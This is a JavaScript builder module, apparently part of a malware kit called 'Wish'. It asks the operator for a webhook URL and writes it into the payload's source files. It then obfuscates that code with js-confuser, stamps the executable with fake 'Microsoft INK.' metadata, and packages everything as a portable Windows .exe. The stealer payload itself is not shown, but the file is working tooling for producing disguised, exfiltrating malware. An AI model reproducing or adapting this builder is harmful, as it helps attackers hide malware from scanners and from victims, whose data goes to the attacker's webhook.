const child_process = require('child_process');
const electron = require('electron-builder');
const gradient = require('gradient-string');
const imageToIco = require('image-to-ico');
const jsConfuser = require('js-confuser');
const chalk = require('chalk-animation');
const readline = require('readline');
const axios = require('axios');
const path = require('path');
const fs = require('fs');

const utils = require('./utils.js');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

class Builder {
  constructor(options = {}) {
    this.options = options;
    this.srcDir = this.options.sourceDir;
    this.currentQst = 0;
    this.jsonConfig = {};
  }

  async CreateIcon(imageUrl, imagePathTemp, imagePath) {
    try {
      const response = await axios.get(imageUrl, { responseType: 'stream' });
      const writer = fs.createWriteStream(imagePathTemp);
      response.data.pipe(writer);

      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });

      const buffer = await imageToIco(imagePathTemp, {
        size: [256, 256],
        quality: 100,
        greyscale: false,
      });

      fs.writeFileSync(imagePath, buffer);
      fs.unlinkSync(imagePathTemp);
    } catch (error) {
      console.error(`Error in createIcon: ${error}`);
    }
  }

  async CreateBuild(dirPath) {
    const exeName = this.jsonConfig.EXECUTABLE_NAME || 'Aurita';
    const imageUrl = this.jsonConfig.EXECUTABLE_IMG;
    const buildPath = path.join(process.cwd(), 'build');
    const exeDist = path.join(buildPath, 'dist', exeName);
    const resultsPath = path.join(buildPath, 'results');
    const imagePathTemp = path.join(buildPath, 'icons', `${exeName}.png`);
    const iconPath = path.join(buildPath, 'icons', `${exeName}.ico`);

    try {
      await this.CreateIcon(imageUrl, imagePathTemp, iconPath);

      await electron.build({
        targets: electron.Platform.WINDOWS.createTarget(null, electron.Arch.x64),
        config: {
          compression: 'normal',
          buildVersion: '1.0.0',
          electronVersion: '17.1.0',
          nodeGypRebuild: false,
          npmRebuild: true,
          appId: 'win32',
          productName: exeName,
          win: {
            artifactName: `${exeName}.exe`,
            target: 'portable',
            icon: iconPath,
          },
          directories: {
            app: dirPath,
            output: exeDist,
          },
        },
      });

      const filesToRemove = [path.join(exeDist, 'builder-debug.yml'), path.join(exeDist, 'builder-effective-config.yaml'), path.join(exeDist, `win-unpacked`)];

      for (const file of filesToRemove) {
        if (fs.existsSync(file)) {
          fs.rmSync(file, { recursive: true });
        }
      }

      const inputExe = path.join(exeDist, `${exeName}.exe`);
      const outputExe = path.join(resultsPath, `${exeName}.exe`);

      fs.renameSync(inputExe, outputExe);
      console.log(`Executable file created at: "${outputExe}"`);

      if (fs.existsSync(exeDist)) {
        fs.rmSync(exeDist, { recursive: true });
      }

      if (fs.existsSync(iconPath)) {
        fs.unlinkSync(iconPath);
      }

      if (fs.existsSync(dirPath)) {
        fs.rmSync(dirPath, { recursive: true });
      }
    } catch (error) {
      console.error('Error during build process:', error);
    }
  }

  async CreateObf() {
    const {
      WEBHOOK: webhookUrl,
      EXECUTABLE_NAME: exeName = 'Wish',
      VERSION: productVersion = '1.0.0',
      DESCRIPTION: appFileDescription = 'Do Do-Hee <3',
      APP_COMPANY: appCompanyName = 'Microsoft INK.',
      APP_LEGAL_COPYRIGHT: appLegalCopyright = 'Microsoft Copyright INK.',
      AUTHOR: author = 'k4itrun',
      LICENSE: license = 'MIT',
    } = this.jsonConfig;

    const outputDir = path.join(process.cwd(), 'build', 'script', exeName);

    const CloneDir = (dirPath, destPath) => {
      try {
        if (!fs.existsSync(destPath)) {
          fs.mkdirSync(destPath);
        }

        const files = fs.readdirSync(dirPath);

        files.forEach((file) => {
          const srcFilePath = path.join(dirPath, file);
          const destFilePath = path.join(destPath, file);

          const isFile = fs.statSync(srcFilePath).isFile();
          const isDirectory = fs.statSync(srcFilePath).isDirectory();

          if (isFile) {
            fs.copyFileSync(srcFilePath, destFilePath);
          }

          if (isDirectory) {
            CloneDir(srcFilePath, destFilePath);
          }
        });
      } catch (error) {
        console.error(`Error while cloning directory: ${error}`);
      }
    };

    const ObfuscateFiles = async (dirPath) => {
      const files = fs.readdirSync(dirPath);

      try {
        for (const file of files) {
          const filePath = path.join(dirPath, file);

          if (fs.statSync(filePath).isDirectory()) {
            await ObfuscateFiles(filePath);
          } else if (file.endsWith('.js') && !filePath.includes('dev') && !filePath.includes('node_modules')) {
            const srcCode = fs.readFileSync(filePath, 'utf-8');

            const applyObfCode = await jsConfuser.obfuscate(srcCode, this.options.confuserOptions);

            await fs.writeFileSync(filePath, applyObfCode);
          }
        }
      } catch (error) {
        console.error(`Error processing directory "${dirPath}"`, error);
      }
    };

    const Obfuscate = async (outputDir) => {
      await ObfuscateFiles(outputDir);
    };

    const ReplaceKeys = (file) => {
      try {
        const content = fs.readFileSync(file, 'utf-8').replace(/%WEBHOOK%/g, webhookUrl);

        fs.writeFileSync(file, content);
      } catch (error) {
        console.error(`Error replacing keys in "${file}"`, error);
      }
    };

    const ReplaceInfos = (file) => {
      try {
        const content = fs
          .readFileSync(file, 'utf-8')
          .replace(/%VERSION%/g, productVersion)
          .replace(/%DESCRIPTION%/g, appFileDescription)
          .replace(/%PRODUCTVERSION%/g, productVersion)
          .replace(/%APPCOMPANYNAME%/g, appCompanyName)
          .replace(/%APPLEGALCOPYRIGHT%/g, appLegalCopyright)
          .replace(/%APPFILEDESCRIPTION%/g, appFileDescription)
          .replace(/%AUTHOR%/g, author)
          .replace(/%LICENSE%/g, license);

        fs.writeFileSync(file, content);
      } catch (error) {
        console.error(`Error replacing infos in "${file}"`, error);
      }
    };

    const Traverse = (dir) => {
      try {
        const files = fs.readdirSync(dir);

        files.forEach((file) => {
          const filePath = path.join(dir, file);
          const isDirectory = fs.statSync(filePath).isDirectory();

          if (isDirectory) {
            Traverse(filePath);
          } else if (file.endsWith('.js') && !filePath.includes('node_modules')) {
            ReplaceKeys(filePath);
          } else if (file.endsWith('.json') && !filePath.includes('node_modules')) {
            ReplaceInfos(filePath);
          }
        });
      } catch (error) {
        console.error(`Error while traversing directory: ${error}`);
      }
    };

    CloneDir(this.srcDir, outputDir);
    await Traverse(outputDir);

    if (this.options.isEnableConfuser) {
      await Obfuscate(outputDir);
    }

    return outputDir;
  }

  async createAsk(qst) {
    try {
      this.currentQst++;

      const answer = await new Promise((resolve) => {
        const questionText = utils.applyGradient(['#fcca7e', '#ed7efc', '#7eb0fc', '#7ee0fc'], `Question ${this.currentQst}: ${qst}`);
        rl.question(questionText, (ans) => {
          resolve(ans.trim());
        });
      });
      return answer;
    } catch (error) {
      console.error('Error while creating question:', error);
      return '';
    }
  }

  installDependencies() {
    try {
      child_process.spawnSync(path.join(this.srcDir, 'install.bat'), [], {
        cwd: path.join(this.srcDir),
        stdio: 'inherit',
      });
    } catch (error) {
      console.error('Error installing dependencies:', error);
    }
  }

  async start() {
    try {
      console.clear();
      chalk.radar(utils.WishBanner()).start();

      setTimeout(async () => {
        chalk.radar(gradient.summer(utils.WishBanner())).stop();

        this.installDependencies();

        console.clear();
        console.log(utils.applyGradient(['#FFFFFF', '#E0BBE4', '#957DAD', '#D291BC', '#F17EF7', '#8A2BE2', '#af45fa'], utils.WishBanner()));

        let webhookUrl = await this.createAsk('Add your "WEBHOOK": ');
        while (!utils.isWebhookUrl(webhookUrl)) {
          webhookUrl = await this.createAsk('Add a "WEBHOOK" validity: ');
        }

        let ImageUrl = await this.createAsk('Please specify the "ICON" using a url with the extensions (Png, Jpg, WebP): ');
        while (!utils.isLinkIcon(ImageUrl)) {
          ImageUrl = await this.createAsk('Specify a valid link for your "ICON" the extensions (Png, Jpg, WebP): ');
        }

        this.jsonConfig.WEBHOOK = webhookUrl;
        this.jsonConfig.EXECUTABLE_IMG = ImageUrl;
        this.jsonConfig.EXECUTABLE_NAME = await this.createAsk('Please specify your \'EXE\' file "Name": ');
        this.jsonConfig.DESCRIPTION = await this.createAsk('Please specify your \'EXE\' file "Description": ');
        this.jsonConfig.APP_COMPANY = await this.createAsk('Please specify your \'EXE\' file "App Company": ');
        this.jsonConfig.APP_LEGAL_COPYRIGHT = await this.createAsk('Please specify your \'EXE\' file "Legal Copyright": ');
        this.jsonConfig.AUTHOR = await this.createAsk('Please specify your \'EXE\' file "Author": ');
        this.jsonConfig.LICENSE = await this.createAsk('Please specify your \'EXE\' file "License": ');

        rl.close();
        console.clear();

        console.log('Obfuscation...');
        const outputDir = await this.CreateObf();

        console.log('Building...');
        await this.CreateBuild(outputDir);

        console.log('Filled...');
      }, 5000);
    } catch (error) {
      console.error(error);
    }
  }
}

module.exports = {
  Builder,
};
